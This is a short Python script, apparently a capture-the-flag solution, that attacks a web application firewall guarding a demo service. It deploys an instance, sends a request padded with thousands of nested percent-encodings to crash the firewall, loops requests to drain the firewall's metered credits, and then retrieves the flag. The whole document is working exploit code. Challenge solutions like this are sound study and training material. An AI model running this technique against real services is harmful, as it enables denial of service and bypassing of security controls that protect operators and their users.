#!/usr/bin/env python3

import sys
import requests


def exploit(base):
    # deploy a demo
    print('[*]', 'Deploying demo...')
    r = requests.post(f'{base}/demo')
    deploymentId = r.text.split('/demo/')[1].split('/')[0]

    # charge only WAF but not app
    print('[*]', 'Crashing WAF...')
    base = f'{base}/demo/{deploymentId}'
    r = requests.post(f'{base}/;0', headers={'Content-Type': 'text/plain'}, data='%' + '25' * 13000)
    assert r.status_code == 500, 'charging only WAF'

    # drain WAF account credits
    print('[*]', 'Draining WAF credits...')
    for i in range(1337-100, 0, -100):
        print('[*]', f'  {i} left')
        r = requests.get(f'{base}/flag')

    # request flag
    print('[*]', 'Requesting flag...')
    flag = r.text.strip()
    print('[+]', f'Flag: {flag}')


def main():
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} <base-url>')
        exit(1)

    base = sys.argv[1]
    exploit(base)


if __name__ == '__main__':
    main()
